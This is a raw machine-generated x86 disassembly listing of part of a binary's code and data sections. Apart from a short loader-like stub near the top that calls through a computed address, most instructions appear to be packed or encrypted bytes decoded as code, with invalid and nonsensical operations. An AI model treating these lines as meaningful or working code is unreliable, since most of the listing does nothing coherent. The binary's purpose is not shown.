  41c676:	mov    WORD PTR [ebx],gs
  41c678:	and    dh,BYTE PTR [ebx]
  41c67a:	fild   QWORD PTR [edi-0x67]
  41c67d:	into   
  41c67e:	jle    0x41c6d2
  41c680:	jle    0x41c674
  41c682:	lock popf 
  41c684:	push   0xdb33e8be
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x2d5e773e,eax
  41c6cc:	sbb    al,BYTE PTR es:[eax]
  41c6cf:	icebp  
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c719
  41c6d7:	and    DWORD PTR [eax+0x791f5a0b],edi
  41c6dd:	mov    bh,0xd9
  41c6df:	or     edi,DWORD PTR [edx]
  41c6e1:	cwde   
  41c6e2:	mov    eax,0xb8d7c0b4
  41c6e7:	push   es
  41c6e8:	xchg   esi,eax
  41c6e9:	ret    0xff8e
  41c6ec:	cs dec ebp
  41c6ee:	or     cl,BYTE PTR [esi]
  41c6f0:	or     al,0xe9
  41c6f2:	jmp    DWORD PTR [edi+0x71]
  41c6f5:	test   BYTE PTR [ecx],dl
  41c6f7:	outs   dx,DWORD PTR ds:[esi]
  41c6f8:	add    dl,BYTE PTR [eax+0x37e5d7bb]
  41c6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6ff:	loope  0x41c6b3
  41c701:	imul   ebx,DWORD PTR [ebx+0x9],0xfffffff9
  41c705:	dec    ecx
  41c706:	call   0x6c66:0x1ab4f397
  41c70d:	shl    DWORD PTR [edi-0x43f3d1a4],0x4b
  41c714:	pop    eax
  41c715:	and    cl,BYTE PTR [esi]
  41c717:	inc    esp
  41c718:	sbb    DWORD PTR ds:0x7e2c5b2d,esi
  41c71e:	scas   al,BYTE PTR es:[edi]
  41c71f:	inc    eax
  41c720:	call   FWORD PTR [ecx+0x7b]
  41c723:	jbe    0x41c6cf
  41c725:	sbb    eax,edi
  41c727:	ins    DWORD PTR es:[edi],dx
  41c728:	xchg   ecx,eax
  41c729:	mov    BYTE PTR [edi+0x71],dl
  41c72c:	shr    DWORD PTR [edx+0x1adc6b1d],cl
  41c732:	mov    edx,0x2b160d25
  41c737:	in     eax,dx
  41c738:	cld    
  41c739:	test   DWORD PTR [eax],esi
  41c73b:	jno    0x41c774
  41c73d:	add    BYTE PTR [edi+0x24],cl
  41c740:	pushf  
  41c741:	lock add DWORD PTR [ecx],0x2
  41c745:	retf   0x1a3b
  41c748:	rcl    DWORD PTR [eax+0x5d8661b1],0xf2
  41c74f:	inc    esp
  41c750:	mov    eax,ds:0x851ccab1
  41c755:	adc    DWORD PTR [edx-0x4b],ecx
  41c758:	std    
  41c759:	retf   
  41c75a:	test   cl,ch
  41c75c:	mov    ds:0x8a4f2619,eax
  41c761:	sbb    eax,0x6a24bf35
  41c766:	ins    DWORD PTR es:[edi],dx
  41c767:	lock mov al,0xa0
  41c76a:	dec    eax
  41c76b:	shr    DWORD PTR [ecx-0x388bbbec],cl
  41c771:	cdq    
  41c772:	rcr    BYTE PTR [ebx-0x53],0x6d
  41c776:	xor    ch,BYTE PTR [ecx]
  41c778:	mov    ah,0x5c
  41c77a:	das    
  41c77b:	lea    edi,[ebp+ebp*2+0x55e5284a]
  41c782:	out    0x8c,al
  41c784:	rcr    DWORD PTR [esi-0x13e97a51],1
  41c78a:	test   eax,0xb8fd322e
  41c78f:	dec    edx
  41c790:	jecxz  0x41c765
  41c792:	jo     0x41c7f4
  41c794:	repz adc DWORD PTR [ebp-0x23],eax
  41c798:	scas   eax,DWORD PTR es:[edi]
  41c799:	jne    0x41c7d9
  41c79b:	inc    edi
  41c79c:	mov    ch,0xa9
  41c79e:	loope  0x41c7e5
  41c7a0:	and    eax,0xf00d1f54
  41c7a5:	leave  
  41c7a6:	in     al,dx
  41c7a7:	loope  0x41c825
  41c7a9:	fsubr  QWORD PTR [edi]
  41c7ab:	pop    edx
  41c7ac:	sbb    al,0x51
  41c7ae:	mov    eax,0xdb3bd5bc
  41c7b3:	jbe    0x41c802
  41c7b5:	cwde   
  41c7b6:	ins    DWORD PTR es:[edi],dx
  41c7b7:	xchg   ecx,eax
  41c7b8:	adc    al,0x8a
  41c7ba:	mov    dl,0x63
  41c7bc:	outs   dx,BYTE PTR ds:[esi]
  41c7bd:	pusha  
  41c7be:	in     eax,dx
  41c7bf:	(bad)  
  41c7c0:	sbb    al,0x9a
  41c7c2:	mov    ebp,0xaf30fd57
  41c7c7:	jecxz  0x41c824
  41c7c9:	or     BYTE PTR [ebp+0x1b7866a],dh
  41c7cf:	adc    al,0x35
  41c7d1:	push   ebp
  41c7d2:	lds    ebx,FWORD PTR [edi+0x2e68b9e9]
  41c7d8:	les    ebx,FWORD PTR [edi-0x4de7d999]
  41c7de:	sti    
  41c7df:	repz inc edx
  41c7e1:	jmp    DWORD PTR [eax+0x1ee4bb00]
  41c7e7:	out    dx,eax
  41c7e8:	jl     0x41c810
  41c7ea:	or     ebx,eax
  41c7ec:	(bad)  
  41c7ed:	sahf   
  41c7ee:	ins    BYTE PTR es:[edi],dx
  41c7ef:	pop    ebp
  41c7f0:	rol    DWORD PTR [ebp+0x91728ed],1
  41c7f6:	fdiv   QWORD PTR [ebx]
  41c7f8:	sub    al,0xa9
  41c7fa:	push   ss
  41c7fb:	ret    0x2d16
  41c7fe:	jae    0x41c7d1
  41c800:	jne    0x41c876
  41c802:	ins    DWORD PTR es:[edi],dx
  41c803:	aam    0x64
  41c805:	mov    al,BYTE PTR [ecx-0x283a890e]
  41c80b:	xor    cl,BYTE PTR [esi]
  41c80d:	pushf  
  41c80e:	retf   0xb42d
  41c811:	adc    eax,0x46246daa
  41c816:	les    edx,FWORD PTR [edi-0xe362031]
  41c81c:	sahf   
  41c81d:	cmp    al,BYTE PTR [ebx-0x7590bece]
  41c823:	cmp    ah,BYTE PTR [ebx+0x87da644]
  41c829:	aaa    
  41c82a:	shl    bl,1
  41c82c:	jno    0x41c7f9
  41c82e:	iret   
  41c82f:	outs   dx,DWORD PTR ds:[esi]
  41c830:	pop    esp
  41c831:	or     eax,0x4e27ab17
  41c836:	ficomp DWORD PTR ds:0xa49dfa21
  41c83c:	(bad)  
  41c83d:	out    dx,al
  41c83e:	jmp    0xd551:0x9dc30e21
  41c845:	mov    eax,ds:0xfe986c0e
  41c84a:	and    eax,0xaa389a0
  41c84f:	or     ch,bl
  41c851:	sar    BYTE PTR [ebp-0x76256b83],0xe0
  41c858:	aad    0x10
  41c85a:	retf   
  41c85b:	js     0x41c86c
  41c85d:	cld    
  41c85e:	mov    bh,0x1f
  41c860:	pop    esp
  41c861:	xchg   edx,eax
  41c862:	sbb    al,BYTE PTR [ebp+0x1c]
  41c865:	mov    bh,0x9a
  41c867:	nop
  41c868:	lock bound eax,QWORD PTR [eax+0x66173949]
  41c86f:	icebp  
  41c870:	jnp    0x41c8ca
  41c872:	hlt    
  41c873:	(bad)  
  41c874:	jbe    0x41c8f0
  41c876:	loop   0x41c862
  41c878:	shr    DWORD PTR [eax-0x68],0xea
  41c87c:	xor    DWORD PTR [esi],ebp
  41c87e:	xor    dl,BYTE PTR [edx+0x592395]
  41c884:	js     0x41c829
  41c886:	pop    ss
  41c887:	push   ebx
  41c888:	jmp    0x4efd3e0
  41c88d:	ret    0x9f7a
  41c890:	push   edx
  41c891:	cwde   
  41c892:	cli    
  41c893:	imul   edx,DWORD PTR [edi+0x7711217f],0x5c
  41c89a:	push   esp
  41c89b:	scas   eax,DWORD PTR es:[edi]
  41c89c:	scas   eax,DWORD PTR es:[edi]
  41c89d:	sub    DWORD PTR [ecx-0x5d3568b5],ebx
  41c8a3:	jmp    0xb4957e2c
  41c8a8:	loope  0x41c85c
  41c8aa:	adc    BYTE PTR [edi+ebp*8-0x7e],al
  41c8ae:	pop    esp
  41c8af:	xlat   BYTE PTR ds:[ebx]
  41c8b0:	jnp    0x41c8f8
  41c8b2:	rcr    DWORD PTR [ebx-0x21],1
  41c8b5:	jns    0x41c83e
  41c8b7:	test   ebp,ebp
  41c8b9:	and    al,0x80
  41c8bb:	sub    ebx,DWORD PTR [edi-0x25796f15]
  41c8c1:	inc    edx
  41c8c2:	aam    0xd5
  41c8c4:	sar    BYTE PTR [ecx+0x28],cl
  41c8c7:	push   ecx
  41c8c8:	dec    ebp
  41c8c9:	add    BYTE PTR [ecx],cl
  41c8cb:	pop    ss
  41c8cc:	bound  ebp,QWORD PTR [eax+0x7d]
  41c8cf:	(bad)  [edi]
  41c8d1:	cmp    eax,0x71b603bf
  41c8d6:	daa    
  41c8d7:	dec    esi
  41c8d8:	dec    ebx
  41c8d9:	ret    
  41c8da:	mov    ds:0xd781da72,al
  41c8df:	outs   dx,DWORD PTR ds:[esi]
  41c8e0:	or     eax,DWORD PTR [eax+0x3f]
  41c8e3:	sbb    edi,DWORD PTR ds:0x82d67d62
  41c8e9:	push   edi
  41c8ea:	push   eax
  41c8eb:	adc    BYTE PTR [eax+ebp*8+0x4a],dh
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	mov    eax,ds:0x187deff7
  41c914:	idiv   DWORD PTR [edi+0x78]
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c89e
  41c91c:	(bad)  
  41c91e:	push   ds
  41c91f:	ds dec ebx
  41c921:	shr    DWORD PTR [edx+0x14],0xcf
  41c925:	cld    
  41c926:	jb     0x41c9a3
  41c928:	sub    eax,0x420b3eb5
  41c92d:	test   DWORD PTR [edx+eax*8-0x2b339e5e],eax
  41c934:	cmp    dl,0xd0
  41c937:	popa   
  41c938:	or     BYTE PTR [eax-0x6f3939eb],0x40
  41c93f:	and    ebp,DWORD PTR [edx-0x49]
  41c942:	es int 0xe5
  41c945:	jp     0x41c8df
  41c947:	pop    ebp
  41c948:	mov    esp,0x2ee30862
  41c94d:	ss push ebx
  41c94f:	adc    BYTE PTR [esi],bl
  41c951:	add    bh,BYTE PTR [ebx+edx*2]
  41c954:	shl    DWORD PTR [edx+0xfab7b85],0xdb
  41c95b:	or     eax,0x75fe9c72
  41c960:	pushf  
  41c961:	addr16 std 
  41c963:	loopne 0x41c9a1
  41c965:	call   0xc0ad:0xc70d495
  41c96c:	xor    BYTE PTR [edx+0xa42e795],ah
  41c972:	pop    esp
  41c973:	mov    DWORD PTR [esi+0x3a85c14f],ebx
  41c979:	jg     0x41c9bb
  41c97b:	push   cs
  41c97c:	pop    edi
  41c97d:	mov    al,0x8c
  41c97f:	dec    esp
  41c980:	lahf   
  41c981:	jo     0x41c9e9
  41c983:	int    0x20
  41c985:	cmp    al,0xc9
  41c987:	ds std 
  41c989:	jns    0x41c9ba
  41c98b:	pop    ss
  41c98c:	adc    eax,0x48d6ac83
  41c991:	test   al,0x3f
  41c993:	fimul  DWORD PTR [ebx]
  41c995:	pop    es
  41c996:	es mov edx,0xdb2bc83
  41c99c:	and    DWORD PTR [ebp-0x53b8f08c],0x61403bc9
  41c9a6:	xor    BYTE PTR [edi],bl
  41c9a8:	gs sbb eax,0xff0be279
  41c9ae:	retf   
  41c9af:	cmp    ebp,ebx
  41c9b1:	push   0x6d
  41c9b3:	lds    ecx,FWORD PTR [edx-0x54]
  41c9b6:	jp     0x41c9cf
  41c9b8:	mul    DWORD PTR [eax-0x2]
  41c9bb:	and    dl,BYTE PTR [ebp+0x72]
  41c9be:	push   edi
  41c9bf:	cmc    
  41c9c0:	xor    DWORD PTR [ebp-0x7fbe557d],edx
  41c9c6:	dec    esp
  41c9c7:	cmp    ecx,DWORD PTR [ebx]
  41c9c9:	cmp    eax,0xcb5de480
  41c9ce:	lock jae 0x41ca40
  41c9d1:	sub    BYTE PTR [edx+0x57b28022],cl
  41c9d7:	cmp    al,0xb
  41c9d9:	ds pop ecx
  41c9db:	pop    ecx
  41c9dc:	in     eax,dx
  41c9dd:	or     ebx,DWORD PTR [ebp+eax*2-0x240605de]
  41c9e4:	mov    dh,0xe4
  41c9e6:	dec    edx
  41c9e7:	gs xor ebx,eax
  41c9ea:	pop    ebp
  41c9eb:	push   eax
  41c9ec:	mov    eax,DWORD PTR [ecx]
  41c9ee:	lds    esp,FWORD PTR [edx+eax*1-0x6b]
  41c9f2:	and    BYTE PTR [eax-0x6e4e67c3],dh
  41c9f8:	cdq    
  41c9f9:	test   eax,0x47ef1d84
  41c9fe:	mov    al,ds:0x30148061
  41ca03:	pop    ds
  41ca04:	dec    ecx
  41ca05:	fstp   DWORD PTR [esi+0x1]
  41ca08:	repnz fld QWORD PTR ss:[esi]
  41ca0c:	imul   esi,ebp,0xb8559c4f
  41ca12:	sbb    bh,al
  41ca14:	aam    0x9
  41ca16:	clc    
  41ca17:	je     0x41ca5f
  41ca19:	(bad)  
  41ca1a:	xor    bh,BYTE PTR [ebx]
  41ca1c:	xchg   edi,eax
  41ca1d:	int    0x3
  41ca1f:	leave  
  41ca20:	mov    al,ds:0x72a38609
  41ca25:	sar    BYTE PTR [ebx+ebx*2],0x64
  41ca29:	leave  
  41ca2a:	mov    cl,BYTE PTR [ebp-0x243d1320]
  41ca30:	pop    es
  41ca31:	outs   dx,BYTE PTR ds:[esi]
  41ca32:	(bad)  
  41ca33:	out    0x91,eax
  41ca35:	or     esp,esp
  41ca37:	leave  
  41ca38:	sbb    eax,0xb6b7a003
  41ca3d:	arpl   bp,sp
  41ca3f:	xchg   ebp,eax
  41ca40:	sbb    BYTE PTR [ecx],cl
  41ca42:	or     al,0x13
  41ca44:	retf   
  41ca45:	loopne 0x41ca5f
  41ca47:	lods   al,BYTE PTR es:[esi]
  41ca49:	jb     0x41ca24
  41ca4b:	pop    edi
  41ca4c:	xor    cl,BYTE PTR [esp+edx*8]
  41ca4f:	(bad)  
  41ca51:	popa   
  41ca52:	aaa    
  41ca53:	sbb    BYTE PTR ds:0x3d1b4e47,dh
  41ca59:	nop
  41ca5a:	out    0xe7,al
  41ca5c:	test   eax,0xc44922b4
  41ca61:	mov    esi,0xe95e0255
  41ca66:	repnz stos BYTE PTR es:[edi],al
  41ca68:	aaa    
  41ca69:	inc    bx
  41ca6b:	jae    0x41cab1
  41ca6d:	dec    edi
  41ca6e:	xor    DWORD PTR [ecx],esp
  41ca70:	data16 fld DWORD PTR [ecx+0x767ddf45]
  41ca77:	cld    
  41ca78:	ins    BYTE PTR es:[edi],dx
  41ca79:	lods   al,BYTE PTR ds:[esi]
  41ca7a:	pop    ebp
  41ca7b:	jmp    0x9cddc2a8
  41ca80:	jmp    0x41caf1
  41ca82:	clc    
  41ca83:	and    BYTE PTR ds:0xd42e6846,0x8b
  41ca8a:	sub    BYTE PTR [edx-0x1a4cae92],dl
  41ca90:	sub    DWORD PTR [esi+0x15],esp
  41ca93:	ja     0x41ca1c
  41ca95:	cmp    ah,cl
  41ca97:	xor    DWORD PTR [ebp+0x522b1be5],eax
  41ca9d:	or     DWORD PTR [edi+0x32],0xffffffc5
  41caa1:	inc    edx
  41caa2:	test   DWORD PTR [eax],0xef622556
  41caa8:	xchg   ecx,eax
  41caa9:	inc    ebx
  41caaa:	and    eax,0xcfe4faaa
  41caaf:	pop    eax
  41cab0:	nop
  41cab1:	bound  edx,QWORD PTR [edx+0x0]
  41cab4:	mov    ds:0xec86f67d,al
  41cab9:	imul   esi,DWORD PTR [esi+0x47],0x23af0b5a
  41cac0:	dec    esp
  41cac1:	xor    al,0x95
  41cac3:	or     eax,0x29f7ed9b
  41cac8:	fstp   DWORD PTR [ebx-0x45aa89ea]
  41cace:	pop    es
  41cacf:	cmp    dh,BYTE PTR [edx-0x5]
  41cad2:	and    DWORD PTR [ecx+0x6d49aad6],eax
  41cad8:	aad    0x28
  41cada:	shl    BYTE PTR [esi],0x69
  41cadd:	hlt    
  41cade:	daa    
  41cadf:	das    
  41cae0:	lock test eax,0x9b220acc
  41cae6:	xchg   ebp,eax
  41cae7:	jp     0x41cb63
  41cae9:	nop
  41caea:	imul   esp,DWORD PTR [eax-0x79],0xffffffac
  41caee:	push   eax
  41caef:	fistp  DWORD PTR [esi-0x6ff5581f]
  41caf5:	push   ds
  41caf6:	clc    
  41caf7:	fsubr  st,st(0)
  41caf9:	pop    ecx
  41cafa:	lock inc ebx
  41cafc:	sbb    al,0xdf
  41cafe:	popf   
  41caff:	cmp    DWORD PTR [ebx+0x6a752404],edi
  41cb05:	push   ds
  41cb06:	add    BYTE PTR [ecx],0x36
  41cb09:	sbb    eax,0x1934da70
  41cb0e:	inc    ecx
  41cb0f:	jno    0x41cb03
  41cb11:	out    dx,eax
  41cb12:	sub    ah,BYTE PTR [ecx+0xc]
  41cb15:	int    0x5d
  41cb17:	add    eax,DWORD PTR [ebx]
  41cb19:	cmp    eax,0x647ae77e
  41cb1e:	cdq    
  41cb1f:	inc    ebx
  41cb20:	jns    0x41cadc
  41cb22:	lods   eax,DWORD PTR ds:[esi]
  41cb23:	aas    
  41cb24:	inc    edx
  41cb25:	fld    TBYTE PTR [esi]
  41cb27:	nop
  41cb28:	daa    
  41cb29:	add    esp,ebx
  41cb2b:	fs stc 
  41cb2d:	gs das 
  41cb2f:	cdq    
  41cb30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb31:	aad    0xd6
  41cb33:	pop    esi
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x52196037
  41cb47:	fiadd  WORD PTR [edi+0x787ff530]
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cbc5
  41cb52:	(bad)  
  41cb53:	mov    es,WORD PTR [edx]
  41cb55:	out    dx,eax
  41cb56:	(bad)  
  41cb57:	sub    bl,BYTE PTR [esi+0x2c53456]
  41cb5d:	fisubr DWORD PTR [edi-0x11]
  41cb60:	mov    dl,0xe3
  41cb62:	outs   dx,DWORD PTR ds:[esi]
  41cb63:	hlt    
  41cb64:	mov    ?,WORD PTR [eax]
  41cb66:	adc    DWORD PTR [ebx+0x54],eax
  41cb69:	jecxz  0x41cb9b
  41cb6b:	inc    edx
  41cb6c:	jmp    DWORD PTR [ebx-0x37]
  41cb6f:	add    eax,0xe0b4cfb5
  41cb74:	aas    
  41cb75:	out    dx,eax
  41cb76:	in     eax,0xa1
  41cb78:	mov    al,0x7
  41cb7a:	enter  0x618f,0xef
  41cb7e:	sbb    BYTE PTR [ecx+0x7512a576],ch
  41cb84:	int    0xcf
  41cb86:	xor    dh,BYTE PTR [ecx]
  41cb88:	xchg   edx,eax
  41cb89:	push   ss
  41cb8a:	add    BYTE PTR [eax+0x35],bl
  41cb8d:	push   ecx
  41cb8e:	mov    al,ds:0xf7f80dd5
  41cb93:	mov    esi,0x84201c68
  41cb98:	push   esi
  41cb99:	call   0x7ccaeb39
  41cb9e:	push   ecx
  41cb9f:	sub    cl,BYTE PTR [edi-0x69ad2e85]
  41cba5:	push   esi
  41cba6:	xor    eax,0x2f402974
  41cbab:	xchg   BYTE PTR [ebx-0x79],dh
  41cbae:	fidivr WORD PTR [edx+0x1]
  41cbb1:	sbb    ch,BYTE PTR [esi]
  41cbb3:	jo     0x41cb90
  41cbb5:	sub    DWORD PTR [ebp-0x10],0x4e0e98ff
  41cbbc:	pop    edi
  41cbbd:	push   ecx
  41cbbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbbf:	inc    esp
  41cbc0:	enter  0xed25,0x4e
  41cbc4:	repnz xor DWORD PTR [ebp-0x6a6ce1d5],ecx
  41cbcb:	ss fwait
  41cbcd:	jp     0x41cb91
  41cbcf:	test   DWORD PTR [ebx+0xb61eb59],eax
  41cbd5:	inc    ebx
  41cbd6:	retf   0x3421
  41cbd9:	rcr    esi,cl
  41cbdb:	mov    WORD PTR [esi],gs
  41cbdd:	sti    
  41cbde:	sbb    al,0x15
  41cbe0:	sub    ch,BYTE PTR [esi]
  41cbe2:	scas   al,BYTE PTR es:[edi]
  41cbe3:	aaa    
  41cbe4:	or     DWORD PTR [ebx+0x25bbf612],edi
  41cbea:	jl     0x41cb97
  41cbec:	in     al,0x34
  41cbee:	push   ss
  41cbef:	push   ebx
  41cbf0:	and    ch,cl
  41cbf2:	pusha  
  41cbf3:	mov    dh,0xf4
  41cbf5:	popa   
  41cbf6:	sahf   
  41cbf7:	cmp    eax,DWORD PTR [ecx]
  41cbf9:	add    esi,edi
  41cbfb:	dec    eax
  41cbfc:	mov    bl,0xeb
  41cbfe:	pop    edx
  41cbff:	shr    BYTE PTR [esi-0x2d5f6160],0x3b
  41cc06:	ins    BYTE PTR es:[edi],dx
  41cc07:	push   ebp
  41cc08:	sub    esp,edi
  41cc0a:	sbb    bh,bl
  41cc0c:	retf   
  41cc0d:	sub    ebp,DWORD PTR [ebp+0x2d49a427]
  41cc13:	jecxz  0x41cbab
  41cc15:	fld    QWORD PTR [ecx-0x62]
  41cc18:	or     al,0x7f
  41cc1a:	mov    ecx,0x6e61bdc9
  41cc1f:	and    esp,DWORD PTR ds:0xabac9b93
  41cc25:	xchg   edi,eax
  41cc26:	sub    DWORD PTR [eax],ebx
  41cc28:	pop    eax
  41cc29:	jp     0x41cbd6
  41cc2b:	loop   0x41cc69
  41cc2d:	retf   
  41cc2e:	daa    
  41cc2f:	bound  esi,QWORD PTR [esi+eiz*8]
  41cc32:	push   edx
  41cc33:	xchg   esi,eax
  41cc34:	or     ebp,DWORD PTR [ebx+0xff83e7]
  41cc3a:	mov    dl,0xd8
  41cc3c:	mov    WORD PTR [ebx-0xe],?
  41cc3f:	xchg   edi,eax
  41cc40:	push   esi
  41cc41:	or     al,BYTE PTR [esi]
  41cc43:	sub    eax,0x2b377af1
  41cc48:	xor    cl,bl
  41cc4a:	mov    dh,BYTE PTR ds:0xd30c7dca
  41cc50:	pop    ds
  41cc51:	push   ss
  41cc52:	das    
  41cc53:	cmp    ebx,esp
  41cc55:	scas   al,BYTE PTR es:[edi]
  41cc56:	sar    DWORD PTR [ebx+0x4ca91856],cl
  41cc5c:	mov    bl,0x56
  41cc5e:	lods   al,BYTE PTR ds:[esi]
  41cc5f:	popf   
  41cc60:	add    esp,DWORD PTR [ebp-0x1be961d2]
  41cc66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc67:	sub    DWORD PTR [eax-0x77],edi
  41cc6a:	adc    ebp,ebp
  41cc6c:	pop    esi
  41cc6d:	popf   
  41cc6e:	lock shl BYTE PTR [esi-0x506e121b],cl
  41cc75:	rol    DWORD PTR [edi-0x1f1daba6],1
  41cc7b:	inc    ecx
  41cc7c:	shl    ch,cl
  41cc7e:	push   esp
  41cc7f:	jnp    0x41cc39
  41cc81:	div    esp
  41cc83:	inc    eax
  41cc84:	cmc    
  41cc85:	pop    es
  41cc86:	pop    ebp
  41cc87:	cmp    ebx,DWORD PTR [ebx]
  41cc89:	push   edx
  41cc8a:	sub    ebp,DWORD PTR [eax+ebp*4-0x34f3019b]
  41cc91:	pop    ebx
  41cc92:	push   ds
  41cc93:	or     DWORD PTR [ebp-0x2eee23d5],ebx
  41cc99:	sti    
  41cc9a:	pop    eax
  41cc9b:	mov    ebp,DWORD PTR [ebx+0x3e573703]
  41cca1:	js     0x41cc6f
  41cca3:	cdq    
  41cca4:	shl    dl,1
  41cca6:	out    0x57,eax
  41cca8:	mov    cl,0xc
  41ccaa:	dec    esi
  41ccab:	test   al,0x8b
  41ccad:	fadd   DWORD PTR [bp+di+0x489e]
  41ccb2:	jb     0x41cd01
  41ccb4:	cmp    ebp,DWORD PTR [edx+ebp*1-0x78c7e718]
  41ccbb:	in     eax,0xf0
  41ccbd:	cvtps2pd xmm2,QWORD PTR [ebx+0x1d]
  41ccc1:	adc    DWORD PTR [edi-0x61],ebp
  41ccc4:	jns    0x41cd30
  41ccc6:	mov    WORD PTR [eax+0x26],fs
  41ccc9:	sahf   
  41ccca:	out    dx,al
  41cccb:	adc    al,ch
  41cccd:	mov    ss,WORD PTR [eax+0x382d827]
  41ccd3:	mov    ebp,0x1bf8fb94
  41ccd8:	dec    ebp
  41ccd9:	cmp    ch,0x0
  41ccdc:	lds    edi,FWORD PTR [ecx+0x65]
  41ccdf:	push   ebp
  41cce0:	leave  
  41cce1:	int3   
  41cce2:	inc    eax
  41cce3:	test   al,0xbb
  41cce5:	call   0x8612:0xaf2cc616
  41ccec:	xor    BYTE PTR [esi-0x15212d39],0xbe
  41ccf3:	mov    eax,ds:0x634fa023
  41ccf8:	sbb    bl,cl
  41ccfa:	sub    eax,0x61955a2c
  41ccff:	sti    
  41cd00:	test   DWORD PTR ds:0xb2bb289b,edi
  41cd06:	add    eax,0x2b3dfc1b
  41cd0b:	mov    WORD PTR [ebp-0x7c0da454],gs
  41cd11:	ja     0x41ccde
  41cd13:	xchg   DWORD PTR [ebp-0x5d],ebp
  41cd16:	inc    esp
  41cd17:	(bad)
  41cd1a:	je     0x41cd37
  41cd1c:	scas   eax,DWORD PTR es:[edi]
  41cd1d:	mov    ebx,0x41e61ca0
  41cd22:	dec    ebp
  41cd23:	cmp    edx,eax
  41cd25:	in     eax,0x33
  41cd27:	fmul   QWORD PTR [eax-0x6f]
  41cd2a:	mov    dl,0xd7
  41cd2c:	dec    edx
  41cd2d:	fbld   TBYTE PTR [edx+0x6c]
  41cd30:	lahf   
  41cd31:	add    al,0x44
  41cd33:	inc    ebp
  41cd34:	loop   0x41cd4c
  41cd36:	in     eax,0x87
  41cd38:	inc    edi
  41cd39:	cmc    
  41cd3a:	sbb    BYTE PTR [ecx-0x41],ah
  41cd3d:	out    0x56,eax
  41cd3f:	ins    BYTE PTR es:[edi],dx
  41cd40:	fnstcw WORD PTR [ebp+0x1c1ddb70]
  41cd46:	lock mov ds:0x64e782ae,al
  41cd4c:	jno    0x41cd4f
  41cd4e:	ret    0x73fc
  41cd51:	daa    
  41cd52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd53:	call   0x7c0:0xea47a0c9
  41cd5a:	es jns 0x41cd56
  41cd5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd5e:	ja     0x41cd60
  41cd60:	es push eax
  41cd62:	aas    
  41cd63:	js     0x41cde4
  41cd65:	mov    ss,WORD PTR [ebx]
  41cd67:	mov    ds:0xc2c95b37,al
  41cd6c:	adc    BYTE PTR [eax],al

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
